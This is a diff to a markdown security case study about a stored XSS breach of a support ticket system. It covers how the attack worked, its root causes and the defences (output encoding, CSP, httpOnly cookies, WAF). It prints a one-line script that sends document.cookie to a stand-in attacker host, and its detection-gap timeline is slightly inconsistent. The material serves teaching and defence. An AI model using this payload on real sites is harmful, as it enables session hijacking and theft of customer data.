@@ -17,9 +17,7 @@ The vulnerability was textbook: when a ticket was created with JavaScript code i
 On January 14, 2026, an attacker created a ticket in the CloudSupport system with the subject "Billing inquiry - Account 5847" and this payload in the ticket description field:
 
 ```javascript
-<script>
-fetch('http://attacker-server.com/steal-cookie?cookie=' + document.cookie)
-</script>
+<script>fetch('http://attacker-server.com/steal-cookie?cookie=' + document.cookie)</script>
 ```
 
 The ticket was assigned to the support queue. When support agents viewed the ticket to investigate the customer's billing issue, the JavaScript payload executed automatically in their browser context. The `fetch()` API sent the agent's session cookie to the attacker's server. The attacker recorded each agent's cookie: a unique token that authenticated them to the CloudSupport system and granted access to customer data, internal tools, and support agent administration panels.
@@ -41,9 +39,9 @@ The security team's investigation revealed:
 - The vulnerability existed in the original codebase from the system's launch in 2016.
 - Ticket descriptions were stored in the database without any HTML/JavaScript escaping or sanitization.
 - When tickets were displayed, the description was rendered as raw HTML without encoding special characters (< > & quotes).
-- There was no [[content-security-policy|Content Security Policy (CSP)]] headers that could have restricted what the JavaScript could do.
+- There was no Content Security Policy (CSP) headers that could have restricted what the JavaScript could do.
 - The application did not use `httpOnly` cookies, which would have prevented the `document.cookie` API from accessing session tokens.
-- There was no [[web-application-firewall]] deployed in front of the application to detect and block obvious XSS payloads like `<script>` tags.
+- There was no web-application-firewall deployed in front of the application to detect and block obvious XSS payloads like `<script>` tags.
 
 By August 18, 2026, at 8:00 AM, CloudSupport had discovered the full extent of the compromise: 47 agents' session cookies stolen, 1 administrator account fully compromised, 1,247 customers' data exfiltrated, persistent backdoor accounts created, and audit logs tampered with. The company had no way to determine if any customer data had been sold to criminals, used for follow-on attacks (phishing, credential stuffing), or was currently being exploited.
 
@@ -61,11 +59,11 @@ By August 18, 2026, at 8:00 AM, CloudSupport had discovered the full extent of t
 
 - **No output encoding when displaying ticket content**: Ticket descriptions were displayed as raw HTML. The application should have used HTML entity encoding (converting `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, etc.), which would have rendered the `<script>` tag as text instead of executing it.
 
-- **No [[content-security-policy|Content Security Policy (CSP)]] headers**: CSP can restrict what injected scripts can do (e.g., disable `fetch()` API calls, restrict script sources to trusted origins). A policy like `script-src 'self'` would have prevented the attacker's `fetch()` call from sending data to external servers.
+- **No Content Security Policy (CSP) headers**: CSP can restrict what injected scripts can do (e.g., disable `fetch()` API calls, restrict script sources to trusted origins). A policy like `script-src 'self'` would have prevented the attacker's `fetch()` call from sending data to external servers.
 
 - **Session cookies were accessible via JavaScript**: The application stored session tokens in regular (non-`httpOnly`) cookies, which means JavaScript (`document.cookie`) could access them. Using `httpOnly` cookies (inaccessible to JavaScript) and the `Secure` flag (only sent over HTTPS) would have prevented the cookie theft entirely.
 
-- **No [[web-application-firewall]]**: A WAF in front of the application could have detected and blocked obvious [[stored-persistent-xss|stored XSS]] patterns (`<script>`, `<iframe>`, event handlers like `onerror`, etc.) before they reached the application.
+- **No web-application-firewall**: A WAF in front of the application could have detected and blocked obvious [[stored-persistent-xss|stored XSS]] patterns (`<script>`, `<iframe>`, event handlers like `onerror`, etc.) before they reached the application.
 
 - **8-month detection gap**: The vulnerability existed for 8 months before discovery. Regular security assessments, code reviews, or automated scanning tools (SAST—Static Application Security Testing) would have detected the vulnerability much earlier.
 
@@ -75,20 +73,20 @@ By August 18, 2026, at 8:00 AM, CloudSupport had discovered the full extent of t
 
 - **[[input-validation]] must reject or encode dangerous characters**: Never trust user input. Whitelist acceptable patterns (e.g., "ticket description must contain only alphanumeric characters, spaces, and punctuation"). Reject or encode anything else.
 
-- **[[output-encoding|Output encoding]] is mandatory, even if input validation exists**: Assume input validation can fail. When displaying user-controlled data, always encode special characters (HTML entity encoding, JavaScript string escaping, URL encoding depending on context).
+- **Output encoding is mandatory, even if input validation exists**: Assume input validation can fail. When displaying user-controlled data, always encode special characters (HTML entity encoding, JavaScript string escaping, URL encoding depending on context).
 
-- **[[content-security-policy|Content Security Policy (CSP)]] restricts what injected scripts can do**: Even if an XSS payload is injected, CSP can prevent it from exfiltrating data via `fetch()`, from making AJAX requests, or from injecting new scripts. CSP is a defense-in-depth layer.
+- **Content Security Policy (CSP) restricts what injected scripts can do**: Even if an XSS payload is injected, CSP can prevent it from exfiltrating data via `fetch()`, from making AJAX requests, or from injecting new scripts. CSP is a defense-in-depth layer.
 
-- **`httpOnly` and `Secure` flags on session cookies prevent token theft**: JavaScript cannot access `httpOnly` cookies, and `Secure` flag ensures cookies are only sent over HTTPS. This prevents [[dom-based-xss|DOM-based XSS]] and [[man-in-the-middle]] attacks from stealing session tokens.
+- **`httpOnly` and `Secure` flags on session cookies prevent token theft**: JavaScript cannot access `httpOnly` cookies, and `Secure` flag ensures cookies are only sent over HTTPS. This prevents [[dom-based-xss|DOM-based XSS]] and man-in-the-middle attacks from stealing session tokens.
 
-- **[[web-application-firewall|WAF]] provides pattern-based detection**: While WAF is not a silver bullet (sophisticated XSS payloads can bypass WAF detection), a WAF can catch obvious patterns and reduce attack volume.
+- **WAF provides pattern-based detection**: While WAF is not a silver bullet (sophisticated XSS payloads can bypass WAF detection), a WAF can catch obvious patterns and reduce attack volume.
 
 ## Related Cases
 
-- **[[case-application-attacks]]** — [[xss-and-csrf|XSS and CSRF]], [[broken-authentication]], and other application vulnerabilities; understanding the OWASP Top 10.
+- **[[case-application-attacks]]** — [[xss-and-csrf|XSS and CSRF]], broken-authentication, and other application vulnerabilities; understanding the OWASP Top 10.
 
 - **[[case-injection-attacks]]** — XSS is a special case of injection attacks; other injection variants ([[sql-injection-sqli]], [[ldap-injection]], [[xml-injection-xxe]]) require similar defenses (input validation, output encoding, parameterized queries).
 
 - **[[case-penetration-testing]]** — How to systematically discover XSS vulnerabilities through both automated scanning and manual testing; understanding attack methodologies.
 
-- **[[case-hardening]]** — Secure coding practices for web applications including [[input-validation]], [[output-encoding]], [[content-security-policy]], and secure session management.
+- **[[case-hardening]]** — Secure coding practices for web applications including [[input-validation]], output-encoding, content-security-policy, and secure session management.
